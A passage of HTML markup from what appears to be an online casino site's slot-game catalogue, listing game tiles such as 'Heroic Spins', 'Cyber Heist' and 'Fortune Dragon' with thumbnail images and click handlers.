                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/18e4a3d7fa77621fd21c0edb66b322d1.webp?v=0.1" src="/assets/games/i/165x220/18e4a3d7fa77621fd21c0edb66b322d1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Secrets of the Golden Lake">Big Bass Secrets of the Golden Lake</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Heroic Spins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Heroic Spins', '/assets/games/i/165x220/bf9ee9b3fd2a364a92f27e29d2af352d.webp?v=0.1' , 'vs20shootstars', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bf9ee9b3fd2a364a92f27e29d2af352d.webp?v=0.1" src="/assets/games/i/165x220/bf9ee9b3fd2a364a92f27e29d2af352d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Heroic Spins">Heroic Spins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise of Pyramids" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise of Pyramids', '/assets/games/i/165x220/10262d160299bd5e224cdce269d678e5.webp?v=0.1' , 'vswayshexhaus', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/10262d160299bd5e224cdce269d678e5.webp?v=0.1" src="/assets/games/i/165x220/10262d160299bd5e224cdce269d678e5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise of Pyramids">Rise of Pyramids</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ripe Rewards" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ripe Rewards', '/assets/games/i/165x220/bcf32236092561c5c611e180e23cd366.webp?v=0.1' , 'vs40stckwldlvl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bcf32236092561c5c611e180e23cd366.webp?v=0.1" src="/assets/games/i/165x220/bcf32236092561c5c611e180e23cd366.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ripe Rewards">Ripe Rewards</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Blitz Bombs" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Blitz Bombs', '/assets/games/i/165x220/06b644df00c041ca41b5a977e29d7f5d.webp?v=0.1' , 'vs20candybltz2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/06b644df00c041ca41b5a977e29d7f5d.webp?v=0.1" src="/assets/games/i/165x220/06b644df00c041ca41b5a977e29d7f5d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Blitz Bombs">Candy Blitz Bombs</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ice Lobster" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ice Lobster', '/assets/games/i/165x220/3420356752eaf5bfa76309283d31c13b.webp?v=0.1' , 'vs20stickypos', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3420356752eaf5bfa76309283d31c13b.webp?v=0.1" src="/assets/games/i/165x220/3420356752eaf5bfa76309283d31c13b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ice Lobster">Ice Lobster</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Barnyard Megahays Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Barnyard Megahays Megaways™', '/assets/games/i/165x220/985d5f5df99d535dd1dce84ac86c2082.webp?v=0.1' , 'vswaysmegahays', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/985d5f5df99d535dd1dce84ac86c2082.webp?v=0.1" src="/assets/games/i/165x220/985d5f5df99d535dd1dce84ac86c2082.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Barnyard Megahays Megaways™">Barnyard Megahays Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Powernudge" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Powernudge', '/assets/games/i/165x220/cf0ba5f77ae146017f19af0a33a161c2.webp?v=0.1' , 'vs20sbpnudge', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cf0ba5f77ae146017f19af0a33a161c2.webp?v=0.1" src="/assets/games/i/165x220/cf0ba5f77ae146017f19af0a33a161c2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Powernudge">Aztec Powernudge</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Release the Bison" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Release the Bison', '/assets/games/i/165x220/6c5c1ce54a870852107373444b5ea32c.webp?v=0.1' , 'vs20bison', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6c5c1ce54a870852107373444b5ea32c.webp?v=0.1" src="/assets/games/i/165x220/6c5c1ce54a870852107373444b5ea32c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Release the Bison">Release the Bison</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Dog House – Dog or Alive" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Dog House – Dog or Alive', '/assets/games/i/165x220/31dbd30b15ffa2384ea5e92796ee8ab8.webp?v=0.1' , 'vs20doghouse2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/31dbd30b15ffa2384ea5e92796ee8ab8.webp?v=0.1" src="/assets/games/i/165x220/31dbd30b15ffa2384ea5e92796ee8ab8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Dog House – Dog or Alive">The Dog House – Dog or Alive</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cyber Heist" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cyber Heist', '/assets/games/i/165x220/1c2b6d1e2a41539e725f1d211a4cc74a.webp?v=0.1' , 'vs20cbrhst', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1c2b6d1e2a41539e725f1d211a4cc74a.webp?v=0.1" src="/assets/games/i/165x220/1c2b6d1e2a41539e725f1d211a4cc74a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cyber Heist">Cyber Heist</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Portals" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Portals', '/assets/games/i/165x220/f2d12146ed073f7e269114fe019be42b.webp?v=0.1' , 'vs20portals', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f2d12146ed073f7e269114fe019be42b.webp?v=0.1" src="/assets/games/i/165x220/f2d12146ed073f7e269114fe019be42b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Portals">Fire Portals</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pot of Fortune" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pot of Fortune', '/assets/games/i/165x220/ff48d1ff5334a7d765fe370f8d33524f.webp?v=0.1' , 'vs20stckwldsc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ff48d1ff5334a7d765fe370f8d33524f.webp?v=0.1" src="/assets/games/i/165x220/ff48d1ff5334a7d765fe370f8d33524f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pot of Fortune">Pot of Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise of Samurai 4" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise of Samurai 4', '/assets/games/i/165x220/719e39b90236f2c6680c9a874705af89.webp?v=0.1' , 'vs15samurai4', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/719e39b90236f2c6680c9a874705af89.webp?v=0.1" src="/assets/games/i/165x220/719e39b90236f2c6680c9a874705af89.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise of Samurai 4">Rise of Samurai 4</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Burger Load it up with Xtra cheese" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Burger Load it up with Xtra cheese', '/assets/games/i/165x220/3ec4dc9a9c4f13613b776befa89f9ef2.webp?v=0.1' , 'vs10bburger', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3ec4dc9a9c4f13613b776befa89f9ef2.webp?v=0.1" src="/assets/games/i/165x220/3ec4dc9a9c4f13613b776befa89f9ef2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Burger Load it up with Xtra cheese">Big Burger Load it up with Xtra cheese</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Day at the Races" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Day at the Races', '/assets/games/i/165x220/ed36866728b45b3d9fe2d13a68e69017.webp?v=0.1' , 'vs10bbbnz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ed36866728b45b3d9fe2d13a68e69017.webp?v=0.1" src="/assets/games/i/165x220/ed36866728b45b3d9fe2d13a68e69017.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Day at the Races">Big Bass Day at the Races</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Beware The Deep Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Beware The Deep Megaways', '/assets/games/i/165x220/07157d118cdf74260a840cb13ac9ee6a.webp?v=0.1' , 'vswaysbewaretd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/07157d118cdf74260a840cb13ac9ee6a.webp?v=0.1" src="/assets/games/i/165x220/07157d118cdf74260a840cb13ac9ee6a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Beware The Deep Megaways">Beware The Deep Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gear of Horus" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gear of Horus', '/assets/games/i/165x220/337a510fade94cebf58086fe96447e5f.webp?v=0.1' , 'vs20clustext', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/337a510fade94cebf58086fe96447e5f.webp?v=0.1" src="/assets/games/i/165x220/337a510fade94cebf58086fe96447e5f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gear of Horus">Gear of Horus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Train to Seoul" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Train to Seoul', '/assets/games/i/165x220/76a89ba6636cd625c8dfb10a9a78a451.webp?v=0.1' , 'vs15seoultrain', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/76a89ba6636cd625c8dfb10a9a78a451.webp?v=0.1" src="/assets/games/i/165x220/76a89ba6636cd625c8dfb10a9a78a451.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Train to Seoul">Train to Seoul</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Olympus Dice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Olympus Dice', '/assets/games/i/165x220/dc6749bb3d7515029722711d945306f6.webp?v=0.1' , 'vs20olympdice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/dc6749bb3d7515029722711d945306f6.webp?v=0.1" src="/assets/games/i/165x220/dc6749bb3d7515029722711d945306f6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Olympus Dice">Gates of Olympus Dice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Power of Ninja" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Power of Ninja', '/assets/games/i/165x220/0d07e95d4aa75ac1a15c4f9409d694e5.webp?v=0.1' , 'vs20ninjapower', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0d07e95d4aa75ac1a15c4f9409d694e5.webp?v=0.1" src="/assets/games/i/165x220/0d07e95d4aa75ac1a15c4f9409d694e5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Power of Ninja">Power of Ninja</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mighty Munching Melons" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mighty Munching Melons', '/assets/games/i/165x220/1627ea98ed87a506cb456398dcb8d69f.webp?v=0.1' , 'vs20mmmelon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/1627ea98ed87a506cb456398dcb8d69f.webp?v=0.1" src="/assets/games/i/165x220/1627ea98ed87a506cb456398dcb8d69f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mighty Munching Melons">Mighty Munching Melons</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Strawberry Cocktail" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Strawberry Cocktail', '/assets/games/i/165x220/3ebd0f4e0b9d8a73b646c334bda6def8.webp?v=0.1' , 'vs10strawberry', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/3ebd0f4e0b9d8a73b646c334bda6def8.webp?v=0.1" src="/assets/games/i/165x220/3ebd0f4e0b9d8a73b646c334bda6def8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Strawberry Cocktail">Strawberry Cocktail</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Great Lagoon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Great Lagoon', '/assets/games/i/165x220/8306f8619cbf63705e06aa82a41c2e85.webp?v=0.1' , 'vs25lagoon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8306f8619cbf63705e06aa82a41c2e85.webp?v=0.1" src="/assets/games/i/165x220/8306f8619cbf63705e06aa82a41c2e85.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Great Lagoon">Great Lagoon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pompeii Megareels Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pompeii Megareels Megaways', '/assets/games/i/165x220/e71d170a13948aa0f92e876411394993.webp?v=0.1' , 'vswaysmegareel', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e71d170a13948aa0f92e876411394993.webp?v=0.1" src="/assets/games/i/165x220/e71d170a13948aa0f92e876411394993.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pompeii Megareels Megaways">Pompeii Megareels Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wheel O’Gold" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wheel O’Gold', '/assets/games/i/165x220/4c517039a413dcd447915e6495f4ea97.webp?v=0.1' , 'vs20multiup', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4c517039a413dcd447915e6495f4ea97.webp?v=0.1" src="/assets/games/i/165x220/4c517039a413dcd447915e6495f4ea97.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wheel O’Gold">Wheel O’Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Alter Ego" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Alter Ego', '/assets/games/i/165x220/be61f176dfd0bec6a4dbaeb4b12653f5.webp?v=0.1' , 'vswaysalterego', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/be61f176dfd0bec6a4dbaeb4b12653f5.webp?v=0.1" src="/assets/games/i/165x220/be61f176dfd0bec6a4dbaeb4b12653f5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Alter Ego">The Alter Ego</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Floats My Boat" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Floats My Boat', '/assets/games/i/165x220/1edc3f37de0f4b07191dc0d6b55a60ea.webp?v=0.1' , 'vs10bbfloats', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1edc3f37de0f4b07191dc0d6b55a60ea.webp?v=0.1" src="/assets/games/i/165x220/1edc3f37de0f4b07191dc0d6b55a60ea.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Floats My Boat">Big Bass Floats My Boat</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Trees of Treasure" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Trees of Treasure', '/assets/games/i/165x220/bdead6194b7d362130679949005febee.webp?v=0.1' , 'vs20treesot', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bdead6194b7d362130679949005febee.webp?v=0.1" src="/assets/games/i/165x220/bdead6194b7d362130679949005febee.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Trees of Treasure">Trees of Treasure</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Ace" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Ace', '/assets/games/i/165x220/65f01128e0b26eaa4dce60558ccd2454.webp?v=0.1' , 'vs1024fortune', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/65f01128e0b26eaa4dce60558ccd2454.webp?v=0.1" src="/assets/games/i/165x220/65f01128e0b26eaa4dce60558ccd2454.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Ace">Fortune Ace</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Blazing Wilds Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Blazing Wilds Megaways', '/assets/games/i/165x220/4604b0f60e894d6fa0ee54f94161ccf0.webp?v=0.1' , 'vswaysfirewmw', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4604b0f60e894d6fa0ee54f94161ccf0.webp?v=0.1" src="/assets/games/i/165x220/4604b0f60e894d6fa0ee54f94161ccf0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Blazing Wilds Megaways">Blazing Wilds Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Loki’s Riches" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Loki’s Riches', '/assets/games/i/165x220/84d812ca1f255eab8d8ce60a53c94386.webp?v=0.1' , 'vs20loksriches', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/84d812ca1f255eab8d8ce60a53c94386.webp?v=0.1" src="/assets/games/i/165x220/84d812ca1f255eab8d8ce60a53c94386.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Loki’s Riches">Loki’s Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Blade &amp;quot; Fangs" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Blade &amp;quot; Fangs', '/assets/games/i/165x220/a5d20efffac35b00050822bdf57f2a45.webp?v=0.1' , 'vs20mergedwndw', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a5d20efffac35b00050822bdf57f2a45.webp?v=0.1" src="/assets/games/i/165x220/a5d20efffac35b00050822bdf57f2a45.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Blade &amp; Fangs">Blade &amp; Fangs</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Wins Bonus" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Wins Bonus', '/assets/games/i/165x220/4e1636fbd0a61bece4ed72e3851352d1.webp?v=0.1' , 'vs1024mjwinbns', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4e1636fbd0a61bece4ed72e3851352d1.webp?v=0.1" src="/assets/games/i/165x220/4e1636fbd0a61bece4ed72e3851352d1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Wins Bonus">Mahjong Wins Bonus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Dragon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Dragon', '/assets/games/i/165x220/6ea443c9716855cc4870b74ee55d01b1.webp?v=0.1' , 'vs243fdragon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6ea443c9716855cc4870b74ee55d01b1.webp?v=0.1" src="/assets/games/i/165x220/6ea443c9716855cc4870b74ee55d01b1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Dragon">Fortune Dragon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Big Dawgs" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Big Dawgs', '/assets/games/i/165x220/289aca593ce3d355651e9c86d31831fc.webp?v=0.1' , 'vs20bigdawgs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/289aca593ce3d355651e9c86d31831fc.webp?v=0.1" src="/assets/games/i/165x220/289aca593ce3d355651e9c86d31831fc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Big Dawgs">The Big Dawgs</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Good Luck &amp;quot; Good Fortune" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Good Luck &amp;quot; Good Fortune', '/assets/games/i/165x220/de17718036b670056167d0edd6b54416.webp?v=0.1' , 'vs10luckfort', '' )" style="">

          <div class="content-wrapper">
              
